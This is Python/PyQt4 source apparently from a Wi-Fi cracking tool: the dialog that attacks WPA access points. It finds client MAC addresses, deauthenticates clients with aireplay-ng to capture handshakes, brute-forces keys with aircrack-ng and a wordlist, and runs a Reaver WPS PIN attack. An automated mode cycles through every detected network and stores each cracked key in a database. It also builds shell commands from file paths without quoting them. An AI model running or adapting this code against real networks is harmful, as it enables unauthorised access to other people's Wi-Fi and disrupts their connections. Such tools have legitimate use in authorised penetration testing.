import re
from core.fern import *
from gui.attack_panel import *
from core.functions import *
from core.settings import *
from core.variables import *

from core import variables

from PyQt4 import QtGui,QtCore
#
# Wpa Attack window class for decrypting wep keys
#

class wpa_attack_dialog(QtGui.QDialog,Ui_attack_panel):
    def __init__(self):
        QtGui.QDialog.__init__(self)
        self.setupUi(self)
        self.retranslateUi(self)
        self.setWindowModality(QtCore.Qt.ApplicationModal)
        self.access_point = str()
        self.client_list = []
        self.started = False                # If False it means attack is not active or has been stopped, can be used to control process

        self.wordlist = str()

        self.settings = Fern_settings()     # For saving settings

        self.wps_update_timer = QtCore.QTimer(self)
        self.connect(self.wps_update_timer,QtCore.SIGNAL("timeout()"),self.set_if_WPS_Support)
        self.wps_update_timer.start(1000)

        self.connect(self.attack_button,QtCore.SIGNAL("clicked()"),self.launch_attack)
        self.connect(self.dictionary_set,QtCore.SIGNAL("clicked()"),self.dictionary_setting)
        self.connect(self,QtCore.SIGNAL("update client"),self.update_client_list)
        self.connect(self,QtCore.SIGNAL("client not in list"),self.display_client)
        self.connect(self,QtCore.SIGNAL("client is there"),self.client_available)
        self.connect(self.wps_attack_radio,QtCore.SIGNAL("clicked()"),self.check_reaver_status)
        self.connect(self,QtCore.SIGNAL("deauthenticating"),self.deauthenticating_display)
        self.connect(self,QtCore.SIGNAL("handshake captured"),self.handshake_captured)
        self.connect(self,QtCore.SIGNAL("bruteforcing"),self.bruteforce_display)
        self.connect(self,QtCore.SIGNAL("wpa key found"),self.wpa_key_found)
        self.connect(self,QtCore.SIGNAL("update_word(QString)"),self.update_word_label)
        self.connect(self,QtCore.SIGNAL("update_progressbar"),self.update_progress_bar)
        self.connect(self,QtCore.SIGNAL("update_speed(QString)"),self.update_speed_label)
        self.connect(self,QtCore.SIGNAL("wpa key not found"),self.key_not_found)
        self.connect(self,QtCore.SIGNAL("set maximum"),self.set_maximum)
        self.connect(self,QtCore.SIGNAL("Stop progress display"),self.display_label)
        self.connect(self,QtCore.SIGNAL("wordlist_lines_counted(QString)"),self.set_progress_bar)

        if len(self.client_list) == 0:
            thread.start_new_thread(self.auto_add_clients,())

        victim_access_point = sorted(wpa_details.keys())[0]
        variables.victim_mac = wpa_details[victim_access_point][0]
        variables.victim_channel = wpa_details[victim_access_point][1]
        variables.victim_access_point = victim_access_point

        victim_power = wpa_details[victim_access_point][3]
        victim_speed = wpa_details[victim_access_point][2]

        cracked_key = get_key_from_database(variables.victim_mac,"WPA")
        if(cracked_key):
            self.key_label.setVisible(True)
            self.key_label.setText('<font color=red>WPA KEY: %s</font>'%(cracked_key))
        else:
            self.key_label.setVisible(False)

        self.essid_label.setText('<font color=red>%s</font>'%(str(victim_access_point)))
        self.bssid_label.setText('<font color=red>%s</font>'%(str(variables.victim_mac)))
        self.channel_label.setText('<font color=red>%s</font>'%(str(variables.victim_channel)))
        self.power_label.setText('<font color=red>%s</font>'%(str(victim_power)))
        self.encrypt_wep_label.setText('<font color=red>WPA</font>')
        self.set_if_WPS_Support()




        ############## ATACK PANEL METHODS #####################
        self.access_points = set()
        self.client_list = []

        self.index = 0
        self.isfinished = False
        self.control = True
        self.cracked_keys = 0
        self.thread_control = True

        self.select_client = str()
        self.progress_bar_max = int()
        self.wpa_key_commit = str()
        self.current_word= str()
        self.word_number = int()
        self.current_speed = str()

        self.access_points = set()
        self.mac_address = str()
        self.wifi_icon = QtGui.QPixmap("%s/resources/radio-wireless-signal-icone-5919-96.png"%os.getcwd())

        self.connect(self,QtCore.SIGNAL("new access point detected"),self.display_new_access_point)
        self.connect(self.ap_listwidget,QtCore.SIGNAL("itemSelectionChanged()"),self.display_selected_target)

        self.connect(self,QtCore.SIGNAL("start automated attack"),self.wpa_launch_attack)
        self.connect(self,QtCore.SIGNAL("change tree item"),self.change_treeItem)

        self.wpa_disable_items()
        self.ap_listwidget.clear()
        thread.start_new_thread(self.Check_New_Access_Point,())

        self.keys_cracked_label.setVisible(False)
        self.display_current_wordlist()                                                             # Display previous wordlist
        self.setStyleSheet('background-image: url("%s/resources/binary_2.png");color:rgb(172,172,172);'%(os.getcwd()))
        self.attack_type_combo.setStyleSheet('color: rgb(172,172,172);background-color: black;font: %spt;'%(font_size()))
        self.set_Key_Clipbord()

     ############## CLIPBOARD AND CONTEXT METHODS #####################

    def set_Key_Clipbord(self):
        self.clipboard_key = str()
        self.clipbord = QtGui.QApplication.clipboard()
        self.key_label.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.wps_pin_label.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)

        self.connect(self.key_label,QtCore.SIGNAL("customContextMenuRequested(QPoint)"),self.show_key_menu)
        self.connect(self.wps_pin_label,QtCore.SIGNAL("customContextMenuRequested(QPoint)"),self.show_wps_key_menu)


    def Copy_Key(self,key_type):
        key_string = str()

        if(key_type == "WPS PIN"):
            key_string = self.wps_pin_label.text()
            actual_key = re.findall("WPS PIN: ([\S \w]+)</font>",key_string)
            if(actual_key):
                self.clipboard_key = actual_key[0]
        else:
            key_string = self.key_label.text()
            actual_key = re.findall("WPA KEY: ([\S \w]+)</font>",key_string)
            if(actual_key):
                self.clipboard_key = actual_key[0]
        self.clipbord.setText(self.clipboard_key)


    def show_key_menu(self,pos):
        menu = QtGui.QMenu()

        copy_action = object()
        convert_ascii_action = object()
        convert_hex_action = object()

        copy_action = menu.addAction("Copy Key")

        selected_action = menu.exec_(self.key_label.mapToGlobal(pos))

        if(selected_action == copy_action):
            self.Copy_Key("OTHER KEY")



    def show_wps_key_menu(self,pos):
        menu = QtGui.QMenu()
        copy_action = menu.addAction("Copy WPS Pin")

        selected_action = menu.exec_(self.key_label.mapToGlobal(pos))
        if(selected_action == copy_action):
            self.Copy_Key("WPS PIN")


    ############## END OF CLIPBOARD AND CONTEXT METHODS #################


    def set_Progressbar_color(self,color):
        COLOR_STYLE = '''
        QProgressBar {
             border: 2px solid %s;
             border-radius: 10px;
         }

         QProgressBar::chunk {
             background-color: %s;
         }
        '''
        self.progressBar.setStyleSheet(COLOR_STYLE % (color,color))


    def display_selected_target(self):
        self.client_list = []
        self.attack_type_combo.clear()

        selected_item = self.ap_listwidget.currentItem()
        victim_access_point = str(selected_item.text())

        # wpa_details = {'Elite': ['00:C0:CA:8B:15:62', '1', '54', '10']}

        variables.victim_mac = wpa_details[victim_access_point][0]
        variables.victim_channel = wpa_details[victim_access_point][1]
        variables.victim_access_point = victim_access_point

        victim_power = wpa_details[victim_access_point][3]
        victim_speed = wpa_details[victim_access_point][2]

        self.essid_label.setText('<font color=red>%s</font>'%(str(victim_access_point)))
        self.bssid_label.setText('<font color=red>%s</font>'%(str(variables.victim_mac)))
        self.channel_label.setText('<font color=red>%s</font>'%(str(variables.victim_channel)))
        self.power_label.setText('<font color=red>%s</font>'%(str(victim_power)))
        self.encrypt_wep_label.setText('<font color=red>WPA</font>')
        self.set_if_WPS_Support()

        cracked_key = get_key_from_database(variables.victim_mac,"WPA")
        if(cracked_key):
            self.key_label.setVisible(True)
            self.key_label.setText('<font color=red>WPA KEY: %s</font>'%(cracked_key))
            self.tip_display()
        else:
            self.key_label.setVisible(False)

        self.client_update()
        self.emit(QtCore.SIGNAL("update client"))
        if len(self.client_list) == 0:
            thread.start_new_thread(self.auto_add_clients,())


    def show_tips(self):
        tips = tips_window()
        tips.type = 2
        tips.setWindowTitle("Tips")
        tips.label_2.setText("To copy the successfully cracked keys to clipboard, Please right click")
        tips.label_3.setText("on the key of your choice and select \"Copy\".")
        tips.label_4.setText("You can also convert between ASCII to HEX keys for WEP.")
        tips.label_5.setVisible(False)
        tips.exec_()



    def tip_display(self):
        if(self.settings.setting_exists("copy key tips")):
            if(self.settings.read_last_settings("copy key tips") == "0"):
                self.show_tips()
        else:
            self.settings.create_settings("copy key tips","1")
            self.show_tips()


    def display_access_points(self):
        self.ap_listwidget.clear()
        self.ap_listwidget.setSpacing(12)
        for access_point in wpa_details.keys():
            self.access_points.add(access_point)
            item =  QtGui.QListWidgetItem(self.ap_listwidget)
            icon = QtGui.QIcon()
            icon.addPixmap(self.wifi_icon)
            item.setIcon(icon)
            item.setText(access_point)
            self.ap_listwidget.addItem(item)
        self.ap_listwidget.sortItems(QtCore.Qt.AscendingOrder)
        self.ap_listwidget.setMovement(QtGui.QListView.Snap)


    def Check_New_Access_Point(self):
        while(True):
            updated_list = set(wpa_details.keys())
            if(True):
                new_list = self.access_points.symmetric_difference(updated_list)
                if(len(list(new_list))):
                    self.emit(QtCore.SIGNAL("new access point detected"))
            time.sleep(4)


    def display_new_access_point(self):
        self.ap_listwidget.setSpacing(12)
        new_access_points = self.access_points.symmetric_difference(set(wpa_details.keys()))
        for access_point in list(new_access_points):
            self.access_points.add(access_point)
            item =  QtGui.QListWidgetItem(self.ap_listwidget)
            icon = QtGui.QIcon()
            icon.addPixmap(self.wifi_icon)
            item.setIcon(icon)
            item.setText(access_point)
            self.ap_listwidget.addItem(item)
        self.ap_listwidget.sortItems(QtCore.Qt.AscendingOrder)
        self.ap_listwidget.setMovement(QtGui.QListView.Snap)

    #
    # SIGNALS AND SLOTS
    #

    def wpa_disable_items(self):
        self.cracking_label_2.setEnabled(False)
        self.injecting_label.setEnabled(False)
        self.associate_label.setEnabled(False)
        self.injection_work_label_2.setEnabled(False)
        self.gathering_label.setEnabled(False)
        self.progressBar.setValue(0)
        self.set_Progressbar_color("#8B0000")       # RED
        self.ivs_progress_label.setEnabled(False)
        self.dictionary_set.setVisible(False)
        self.injecting_label.setText("Deauthentication Status")
        self.associate_label.setText("Probing Access Point")
        self.injection_work_label_2.setText("Current Dictionary File")
        self.ivs_progress_label.setText('Current Phrase')
        self.cracking_label_2.setText("Bruteforcing Encryption")
        self.gathering_label.setText("Handshake Status")
        self.finished_label.setText("Finished")
        self.finished_label.setEnabled(False)
        self.dictionary_set.setVisible(True)
        self.key_label.setVisible(False)
        self.attack_type_combo.setEditable(True)

        if self.automate_checkbox.isChecked() == False:
            self.keys_cracked_label.setVisible(False)

        self.wps_pin_label.setVisible(False)
        self.attack_button.setText("Attack")


    def set_if_WPS_Support(self,messagebox = False):
        victim_mac = variables.victim_mac
        if not variables.wps_functions.is_WPS_Device(victim_mac):
            self.wps_support_label.setEnabled(False)
            self.wps_support_label.setText("Supports WPS")
            if(messagebox):
                QtGui.QMessageBox.warning(self,"WPS Device Support","WPS (WIFI Protected Setup) is not supported or is disabled by the selected access point")
            self.regular_attack_radio.setChecked(True)
            return

        self.wps_support_label.setEnabled(True)
        self.wps_support_label.setText("<font color=yellow>Supports WPS</font>")


    def check_reaver_status(self):
        if not variables.wps_functions.reaver_Installed():
            answer = QtGui.QMessageBox.question(self,"Reaver not Detected",
            '''The Reaver tool is currently not installed,The tool is necessary for attacking WPS Access Points.\n\nDo you want to open the download link?''',
            QtGui.QMessageBox.Yes,QtGui.QMessageBox.No)
            if(answer == QtGui.QMessageBox.Yes):
                variables.wps_functions.browse_Reaver_Link()

            self.regular_attack_radio.setChecked(True)
            return

        self.set_if_WPS_Support(True)


    ############################################################################


    def cancel_wpa_attack(self):
        commands.getstatusoutput('killall airodump-ng')
        commands.getstatusoutput('killall aircrack-ng')
        commands.getstatusoutput('killall aireplay-ng')
        self.disconnect(self.attack_button,QtCore.SIGNAL("clicked()"),self.cancel_wpa_attack)
        self.connect(self.attack_button,QtCore.SIGNAL("clicked()"),self.launch_attack)
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("%s/resources/wifi_4.png"%(os.getcwd())))
        self.attack_button.setIcon(icon)
        self.attack_button.setText('Attack')
        self.thread_control = True
        self.started = False

        if(self.wps_attack_radio.isChecked()):
            variables.wps_functions.stop_Attack_WPS_Device()




    def update_client_list(self):
        client_mac_addresses = []
        for mac_address in self.client_list:
            if str(mac_address) not in client_mac_addresses:
                client_mac_addresses.append(str(mac_address))
        self.attack_type_combo.clear()
        self.attack_type_combo.addItems(client_mac_addresses)

        if bool(client_mac_addresses):
            if(self.automate_checkbox.isChecked()):
                if self.thread_control == True:
                    self.wpa_launch_attack()


    def display_client(self):
        self.ivs_progress_label.setEnabled(True)
        self.ivs_progress_label.setText("<font color=red>Automatically probing and adding clients mac-addresses, please wait...</font>")

    def client_available(self):
        self.ivs_progress_label.setEnabled(False)
        self.ivs_progress_label.setText("Current Phrase")

    def deauthenticating_display(self):
        self.injecting_label.setEnabled(True)
        self.injecting_label.setText('<font color=yellow>Deauthenticating %s</font>'%(self.select_client))

    def handshake_captured(self):
        self.gathering_label.setEnabled(True)
        self.gathering_label.setText('<font color=yellow>Handshake Captured</font>')

        if self.settings.setting_exists('capture_directory'):
            shutil.copyfile('/tmp/fern-log/WPA-DUMP/wpa_dump-01.cap',\
                self.settings.read_last_settings('capture_directory') + '/%s_Capture_File(WPA).cap'%(variables.victim_access_point))


    def bruteforce_display(self):
        self.cracking_label_2.setEnabled(True)
        self.cracking_label_2.setText('<font color=yellow>Bruteforcing WPA Encryption</font>')

    def wpa_key_found(self):
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("%s/resources/wifi_4.png"%(os.getcwd())))
        self.attack_button.setIcon(icon)
        self.attack_button.setText('Attack')

        self.new_automate_key()

        wpa_key_read = reader('/tmp/fern-log/WPA-DUMP/wpa_key.txt')
        self.finished_label.setEnabled(True)
        self.finished_label.setText('<font color=yellow>Finished</font>')
        self.key_label.setEnabled(True)
        self.cancel_wpa_attack()
        self.key_label.setVisible(True)
        self.key_label.setText('<font color=red>WPA KEY: %s</font>'%(wpa_key_read))
        self.set_Progressbar_color("green")

        if self.wpa_key_commit == 0:
            set_key_entries(variables.victim_access_point,variables.victim_mac,'WPA',wpa_key_read,variables.victim_channel)            #Add WPA Key to Database Here
            self.emit(QtCore.SIGNAL('update database label'))
            self.wpa_key_commit += 1
            self.isfinished = True

        self.tip_display()      # Display tips



    def update_word_label(self,current_word):
        self.ivs_progress_label.setEnabled(True)
        self.ivs_progress_label.setText('<font color=yellow>%s</font>'%(current_word))

    def update_progress_bar(self):
        self.progressBar.setValue(self.word_number)


    def update_speed_label(self,current_speed):
        self.finished_label.setEnabled(True)
        self.finished_label.setText('<font color=yellow>Speed: \t %s k/s</font>'%(current_speed))

    def display_label(self):
        self.finished_label.setEnabled(True)
        self.finished_label.setText('<font color=yellow>Finished</font>')

    def key_not_found(self):
        self.finished_label.setEnabled(True)
        self.finished_label.setText('<font color=yellow>Finished</font>')
        if 'wpa_key.txt' in os.listdir('/tmp/fern-log/WPA-DUMP/'):
            pass
        else:
            self.ivs_progress_label.setEnabled(True)
            self.ivs_progress_label.setText('<font color=red>WPA Key was not found, please try another wordlist file</font>')

            if bool(self.client_list):
                if(self.automate_checkbox.isChecked()):
                    if self.thread_control == True:
                        self.wpa_launch_attack()

    def set_maximum(self):
        self.progressBar.setValue(self.progress_bar_max)



    #
    # Threads For Automation
    #
    def auto_add_clients(self):
        loop_control = True
        temp_mac_address = str(variables.victim_mac.strip(' '))
        while temp_mac_address not in self.client_list:
            if(self.wps_attack_radio.isChecked()):
                if(variables.wps_functions.is_WPS_Device(variables.victim_mac)):
                    self.emit(QtCore.SIGNAL("client is there"))
                    self.emit(QtCore.SIGNAL("update client"))
                    return
            if len(self.client_list) >= 1:
                self.emit(QtCore.SIGNAL("client is there"))
                self.emit(QtCore.SIGNAL("update client"))
                break
            else:
                time.sleep(6)
                if not self.started:
                    self.emit(QtCore.SIGNAL("client not in list"))
                if(loop_control):
                    thread.start_new_thread(self.probe_for_Client_Mac,())
                    loop_control = False
                self.client_update()
                self.emit(QtCore.SIGNAL("update client"))


    def probe_for_Client_Mac(self):
        variables.exec_command("airodump-ng -a --channel %s --write /tmp/fern-log/WPA/zfern-wpa \
                                                --output-format csv  --encrypt wpa %s"%(variables.victim_channel,variables.monitor_interface))


    def client_update(self):
        wpa_clients_str = reader('/tmp/fern-log/WPA/zfern-wpa-01.csv')
        wpa_clients_sort = wpa_clients_str[wpa_clients_str.index('Probed ESSIDs'):-1]

        for line in wpa_clients_sort.splitlines():
            result = re.findall("(([0-9A-F]{2}:){5}[0-9A-F]{2})",line)
            if(len(result) == 2):
                if(result[1][0] == variables.victim_mac):
                    self.client_list.append(result[0][0])


    def launch_brutefore(self):
        current_word_regex = re.compile("Current passphrase: ([\w\s!@#$%^&*()-=_+]+)",re.IGNORECASE)
        keys_speed_regex = re.compile("(\d+.?\d+) k/s",re.IGNORECASE)
        keys_tested_regex = re.compile("(\d+) keys tested",re.IGNORECASE)

        crack_process = subprocess.Popen("cd /tmp/fern-log/WPA-DUMP/ \naircrack-ng -a 2 -w '%s' *.cap -l wpa_key.txt" % (self.wordlist),
                             shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)

        stdout = crack_process.stdout

        while 'wpa_key.txt' not in os.listdir('/tmp/fern-log/WPA-DUMP/'):
            stdout_read = stdout.readline()
            self.current_word = str()

            current_word = current_word_regex.findall(stdout_read)
            if(current_word):
                self.current_word = current_word[0]
                self.emit(QtCore.SIGNAL("update_word(QString)"),self.current_word)

            word_number = keys_tested_regex.findall(stdout_read)
            if(word_number):
                self.word_number = int(word_number[0])
                self.emit(QtCore.SIGNAL("update_progressbar"))

            current_speed = keys_speed_regex.findall(stdout_read)
            if(current_speed):
                self.current_speed = current_speed[0]
                self.emit(QtCore.SIGNAL("update_speed(QString)"),self.current_speed)

        self.emit(QtCore.SIGNAL("wpa key found"))



    def wpa_capture(self):
        monitor_interface = variables.monitor_interface
        variables.exec_command('%s airodump-ng --bssid %s --channel %s -w /tmp/fern-log/WPA-DUMP/wpa_dump %s'%(variables.xterm_setting,variables.victim_mac,variables.victim_channel,monitor_interface))

    def deauthenticate_client(self):
        monitor_interface = variables.monitor_interface
        variables.exec_command('%s aireplay-ng -a %s -c %s -0 5 %s'%(variables.xterm_setting,variables.victim_mac,self.select_client,monitor_interface))

    def capture_check(self):
        variables.exec_command('cd /tmp/fern-log/WPA-DUMP/ \n aircrack-ng *.cap | tee capture_status.log')

    def capture_loop(self):
        time.sleep(3)
        self.emit(QtCore.SIGNAL("deauthenticating"))
        while '1 handshake' not in reader('/tmp/fern-log/WPA-DUMP/capture_status.log'):
            if(self.started == False):                                  # Break deauthentication loop if attack has been stopped
                return
            thread.start_new_thread(self.deauthenticate_client,())
            time.sleep(10)
            thread.start_new_thread(self.capture_check,())
        self.emit(QtCore.SIGNAL("handshake captured"))                  # Handshake captured
        commands.getstatusoutput('killall airodump-ng')
        commands.getstatusoutput('killall aireplay-ng')
        time.sleep(1)
        self.emit(QtCore.SIGNAL("bruteforcing"))

        thread.start_new_thread(self.launch_brutefore,())
        thread.start_new_thread(self.wordlist_check,())



    def wordlist_check(self):
        control_word = 0
        while control_word != 1:
            controller = self.current_word
            time.sleep(30)
            if controller == self.current_word:
                control_word = 1
                self.emit(QtCore.SIGNAL("set maximum"))
                self.emit(QtCore.SIGNAL("wpa key not found"))


    def display_current_wordlist(self):
        if(self.settings.setting_exists("wordlist")):
            get_temp_name = self.settings.read_last_settings("wordlist")   #Just for displaying name of wordlist to label area
            self.wordlist = get_temp_name
            split_name = get_temp_name.split(os.sep)
            if(split_name):
                filename = split_name[-1]
                self.injection_work_label_2.setEnabled(True)
                self.injection_work_label_2.setText('<font color=yellow><b>%s</b></font>'%(filename))
            else:
                self.injection_work_label_2.setEnabled(True)
                self.injection_work_label_2.setText('<font color=red><b>Select Wordlist</b></font>')



    def launch_attack(self):
        if(self.automate_checkbox.isChecked()):
            thread.start_new_thread(self.launch_attack_2,())
        else:
            self.wpa_launch_attack()


    def launch_attack_2(self):
        self.isfinished = True

        for index,access_point in enumerate(wpa_details.keys()):
            variables.victim_access_point = access_point
            variables.victim_mac = wpa_details[access_point][0]
            variables.victim_channel = wpa_details[access_point][1]

            while(self.isfinished == False):
                time.sleep(4)
            if self.control == False:
                break
            if(self.index == (len(wpa_details.keys()) - 1)):
                self.control = False
            if(index >= 1):
                self.emit(QtCore.SIGNAL("change tree item"))
            self.emit(QtCore.SIGNAL("start automated attack"))
            self.index = index
            self.isfinished = False

        while(self.thread_control == False):
            time.sleep(1)



    def change_treeItem(self):
        if(self.automate_checkbox.isChecked()):
            self.ap_listwidget.setCurrentItem(self.ap_listwidget.item(self.index))
            self.display_selected_target()


    def new_automate_key(self):
        self.cracked_keys += 1
        if(self.automate_checkbox.isChecked()):
            self.keys_cracked_label.setVisible(True)
            self.keys_cracked_label.setText("<font color=yellow><b>%s keys cracked</b></font>"%(str(self.cracked_keys)))
        else:
            self.keys_cracked_label.setVisible(False)



    def wpa_launch_attack(self):
        self.wpa_key_commit = 0

        self.wpa_disable_items()

        if(is_already_Cracked(variables.victim_mac,"WPA")):
            answer = QtGui.QMessageBox.question(self,"Access Point Already Cracked",variables.victim_access_point + "'s key already exists in the database, Do you want to attack and update the already saved key?",QtGui.QMessageBox.Yes,QtGui.QMessageBox.No);
            if(answer == QtGui.QMessageBox.No):
                self.control = True
                return

        if(self.wps_attack_radio.isChecked()):                                      # WPS Attack Mode
            self.control = True
            self.wpa_disable_items()
            variables.wps_functions.victim_MAC_Addr = variables.victim_mac
            self.set_WPS_Objects(variables.wps_functions)
            variables.wps_functions.start()
            self.isfinished = False
            self.progressBar.setValue(0)
            self.disconnect(self.attack_button,QtCore.SIGNAL("clicked()"),self.launch_attack)
            self.connect(self.attack_button,QtCore.SIGNAL("clicked()"),self.cancel_wpa_attack)
            icon = QtGui.QIcon()
            icon.addPixmap(QtGui.QPixmap("%s/resources/stop.png"%(os.getcwd())))
            self.attack_button.setIcon(icon)
            self.attack_button.setText('Stop')
            self.started = True
            self.thread_control = False
            return

        self.select_client = self.attack_type_combo.currentText()

        if(self.select_client == str()):
            QtGui.QMessageBox.warning(self,"WPA Attack Requirement","At least one client MAC-Address asscociated with the Access Point is required to successfully attack the WPA Encryption, If you know a client MAC Address you can add it manually or wait for the probing process to detect client addresses")
            self.attack_type_combo.setFocus()
            return

        if not Check_MAC(self.select_client):
            QtGui.QMessageBox.warning(self,'Invalid Client MAC Address',variables.invalid_mac_address_error.strip('/n'))
            return

        self.emit(QtCore.SIGNAL("stop scan"))
        commands.getstatusoutput('killall airodump-ng')
        commands.getstatusoutput('killall airmon-ng')
        commands.getstatusoutput('rm -r /tmp/fern-log/WPA-DUMP/*')

        if self.select_client == str():
            self.associate_label.setEnabled(True)
            self.associate_label.setText('<font color=red>Client mac-address is needed</font>')
        else:
            if not self.settings.setting_exists("wordlist"):
                self.injection_work_label_2.setEnabled(True)
                self.injection_work_label_2.setText('<font color=red><b>Select Wordlist</b></font>')
            else:
                get_temp_name = self.settings.read_last_settings("wordlist")   #Just for displaying name of wordlist to label area
                split_name = get_temp_name.split(os.sep)
                if(split_name):
                    filename = split_name[-1]
                    self.injection_work_label_2.setEnabled(True)
                    self.injection_work_label_2.setText('<font color=yellow><b>%s</b></font>'%(filename))
                else:
                    self.injection_work_label_2.setEnabled(True)
                    self.injection_work_label_2.setText('<font color=red><b>Select Wordlist</b></font>')

                self.progressBar.setMaximum(10000)                                                  # Temporarily set the progressBar to 10000, until actual wordlist count is determined

                if(self.settings.setting_exists(get_temp_name)):                                    # if the line count exists for previously used wordlist
                    self.progress_bar_max = int(self.settings.read_last_settings(get_temp_name))    # set the progress_bar variable to the cached count
                    self.progressBar.setMaximum(self.progress_bar_max)
                else:
                    thread.start_new_thread(self.find_dictionary_length,(get_temp_name,))           # open thread to count the number of lines in the new wordlist


                commands.getstatusoutput('killall airodump-ng')
                commands.getstatusoutput('killall aireplay-ng')
                self.associate_label.setEnabled(True)
                self.associate_label.setText("<font color=yellow>Probing Access Point</font>")
                commands.getstatusoutput('touch /tmp/fern-log/WPA-DUMP/capture_status.log')
                self.progressBar.setValue(0)
                self.disconnect(self.attack_button,QtCore.SIGNAL("clicked()"),self.launch_attack)
                self.connect(self.attack_button,QtCore.SIGNAL("clicked()"),self.cancel_wpa_attack)
                icon = QtGui.QIcon()
                icon.addPixmap(QtGui.QPixmap("%s/resources/stop.png"%(os.getcwd())))
                self.attack_button.setIcon(icon)
                self.attack_button.setText('Stop')
                self.started = True
                self.thread_control = False

                thread.start_new_thread(self.wpa_capture,())

                thread.start_new_thread(self.capture_loop,())


    def find_dictionary_length(self,filename):
        self.progress_bar_max = line_count(filename)
        self.emit(QtCore.SIGNAL("wordlist_lines_counted(QString)"),filename)


    def set_progress_bar(self,filename):
        self.progressBar.setMaximum(self.progress_bar_max)
        self.settings.create_settings(filename,str(self.progress_bar_max))



    def dictionary_setting(self):
        filename = QtGui.QFileDialog.getOpenFileName(self,"Select Wordlist","")
        if(filename):

            self.settings.create_settings("wordlist",filename)

            get_temp_name = self.settings.read_last_settings("wordlist")
            self.wordlist = get_temp_name
            split_name = get_temp_name.replace('/','\n')
            filename_split = split_name.splitlines()
            try:
                filename = filename_split[-1]
            except IndexError:
                self.injection_work_label_2.setText('<font color=red><b>Select Wordlist</b></font>')
            self.injection_work_label_2.setEnabled(True)
            self.injection_work_label_2.setText('<font color=yellow><b>%s</b></font>'%(filename))


    # WPS AND REGULAR ATTACK STARTUP

    def set_WPS_Objects(self,instance):
        self.progressBar.setMaximum(100)
        self.progressBar.setValue(0)
        self.connect(instance,QtCore.SIGNAL("Associating with WPS device"),self.associating_wps)
        self.connect(instance,QtCore.SIGNAL("Bruteforcing WPS Device"),self.associated_bruteforing)
        self.connect(instance,QtCore.SIGNAL("WPS Progress"),self.updating_progress)
        self.connect(instance,QtCore.SIGNAL("Cracked WPS Pin"),self.display_WPS_pin)
        self.connect(instance,QtCore.SIGNAL("Cracked WPS Key"),self.display_Cracked_Key)


    def associating_wps(self):
        self.associate_label.setEnabled(True)
        self.associate_label.setText("<font color=yellow>Associating with WPS Device</font>")


    def associated_bruteforing(self):
        self.injecting_label.setEnabled(True)
        self.gathering_label.setEnabled(True)
        self.injecting_label.setText("<font color=yellow>Associated with %s</font>" % variables.victim_mac)
        self.gathering_label.setText("<font color=yellow>Bruteforcing WPS Device</font>")


    def updating_progress(self):
        self.ivs_progress_label.setEnabled(True)
        self.cracking_label_2.setEnabled(True)

        value = int(float(variables.wps_functions.progress))
        self.progressBar.setValue(value)
        if(value < 33):
            self.set_Progressbar_color("#8B0000")   # RED
        elif(value < 66):
            self.set_Progressbar_color("#CCCC00")   # YELLOW
        else:
            self.set_Progressbar_color("green")

        self.ivs_progress_label.setText("<font color=yellow>" + variables.wps_functions.progress + "% Complete</font>")
        self.cracking_label_2.setText("<font color=yellow>Updating Progress</font>")


    def display_WPS_pin(self):
        self.wps_pin_label.setEnabled(True)
        self.wps_pin_label.setVisible(True)
        self.wps_pin_label.setText("<font color=red>WPS PIN: " + variables.wps_functions.get_keys()[0] + "</font>" )


    def display_Cracked_Key(self):
        self.key_label.setEnabled(True)
        self.key_label.setVisible(True)
        self.key_label.setText("<font color=red>WPA KEY: " + variables.wps_functions.get_keys()[1] + "</font>" )
        self.set_Progressbar_color("green")
        set_key_entries(variables.victim_access_point,variables.victim_mac,'WPA',variables.wps_functions.get_keys()[1],variables.victim_channel)
        self.emit(QtCore.SIGNAL('update database label'))
        self.finished_label.setText("<font color=yellow>Finished</font>")
        self.new_automate_key()
        self.cancel_wpa_attack()
        self.isfinished = True
        self.tip_display()          # Display Tips


    def closeEvent(self,event):
        self.wps_update_timer.stop()

